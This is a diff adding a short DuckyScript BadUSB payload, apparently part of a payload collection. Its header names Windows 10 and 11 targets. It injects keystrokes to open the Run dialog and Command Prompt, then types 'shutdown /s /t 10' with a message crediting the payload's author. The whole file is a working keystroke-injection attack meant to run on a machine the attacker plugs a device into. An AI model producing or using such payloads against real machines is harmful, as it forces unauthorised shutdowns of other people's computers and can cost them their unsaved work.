@@ -1,0 +1,13 @@
+REM Author: KneBellx
+REM Description: Opens Command Prompt and initiates a timed system shutdown sequence on target Windows machine.
+REM Target OS: Windows 10 & 11
+REM Version: 1.0.0
+
+DELAY 1000
+GUI r
+DELAY 600
+STRING cmd
+ENTER
+DELAY 800
+STRING shutdown /s /t 10 /c "System shutdown initiated by KneBellx BadUSB payload."
+ENTER
